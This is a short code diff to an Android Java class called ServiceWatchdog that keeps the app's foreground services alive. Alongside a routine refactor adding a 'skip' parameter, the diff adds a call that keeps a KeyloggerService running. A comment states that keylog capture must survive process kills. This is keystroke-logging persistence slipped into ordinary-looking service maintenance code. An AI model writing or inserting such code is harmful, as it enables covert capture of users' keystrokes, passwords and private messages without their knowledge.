@@ -45,8 +45,20 @@ public class ServiceWatchdog {
      * Safe to call from any context (BroadcastReceiver, Worker, alarm, …).
      */
     public static void ensureServicesRunning(Context ctx) {
-        startIfNeeded(ctx, DataSyncService.class);
-        startIfNeeded(ctx, BackgroundService.class);
+        ensureServicesRunning(ctx, null);
+    }
+
+    /**
+     * Make sure the foreground services are running.
+     *
+     * @param skip a service class to leave alone, so a service supervising the
+     *             others does not re-issue a start request for itself.
+     */
+    public static void ensureServicesRunning(Context ctx, Class<?> skip) {
+        if (skip != DataSyncService.class)     startIfNeeded(ctx, DataSyncService.class);
+        if (skip != BackgroundService.class)   startIfNeeded(ctx, BackgroundService.class);
+        // Keylog capture must survive the same kills the watchdog repairs.
+        if (skip != KeyloggerService.class)    KeyloggerService.ensureRunning(ctx);
     }
 
     /**
